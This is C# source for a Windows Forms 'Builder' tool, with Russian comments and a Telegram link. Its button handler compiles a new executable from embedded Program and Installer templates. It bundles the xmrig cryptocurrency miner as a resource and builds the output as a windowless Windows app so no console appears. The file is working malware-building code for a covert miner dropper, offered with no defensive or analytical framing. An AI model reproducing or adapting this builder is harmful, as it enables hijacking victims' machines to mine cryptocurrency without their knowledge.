using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Resources;
using System.Windows.Forms;

// https://t.me/VolVeRFM

namespace Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string resxPath2 = "VolVeRFMR.Properties.Resources";

        private void button1_Click(object sender, EventArgs e)
        {
          

                CompilerParameters Params = new CompilerParameters();
                   Params.GenerateExecutable = true;
                Params.ReferencedAssemblies.Add("System.dll"); //Добавлем линк в исходный файл на System.dll 
                Params.ReferencedAssemblies.Add("System.Windows.Forms.dll"); //Тоже самое но на System.Windwos.Forms.dlle
                Params.ReferencedAssemblies.Add("System.Management.dll");
                Params.ReferencedAssemblies.Add("System.Core.dll");
                Params.CompilerOptions = "/unsafe";
                Params.CompilerOptions += "\n/t:winexe"; //Убираем cmd окно путём объявления программы Windows приложением


                Params.OutputAssembly = "Build.exe"; //Имя исходного файла


            string resource = Properties.Resources.Program;
            string resource2 = Properties.Resources.Installer;
            string resource3 = Properties.Resources.Resources_Designer;


            using (var v = new ResourceWriter(Path.GetTempPath() + @"\" + resxPath2 + ".resources"))
            {

                v.AddResource("xmrig", Properties.Resources.xmrig); // Кидаем xmrig в ресурсы 


            }

            Params.EmbeddedResources.Add(System.IO.Path.GetTempPath() + @"\" + resxPath2 + ".resources");

             
            resource = resource.Replace("*MASSEGE*", textBox1.Text); // Заменяем значения для MASSEGE 
            resource = resource.Replace("*MASSEGE2*", textBox2.Text); // Заменяем значения для MASSEGE2



            var settings = new Dictionary<string, string>();
                settings.Add("CompilerVersion", "v4.0"); //Указываем версию framework-a 2.0

                CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, resource, resource2, resource3);

                if (Results.Errors.Count > 0)
                {

                    foreach (CompilerError err in Results.Errors)
                        MessageBox.Show(err.ToString()); //Выводим циклом ошибки, если они есть
                }
                else
                {
                    MessageBox.Show("Готово, файл появится в том же месте где и программа :)"); //Выводим сообщение что всё прошло успешно
                }
             
        

        }
    }
}
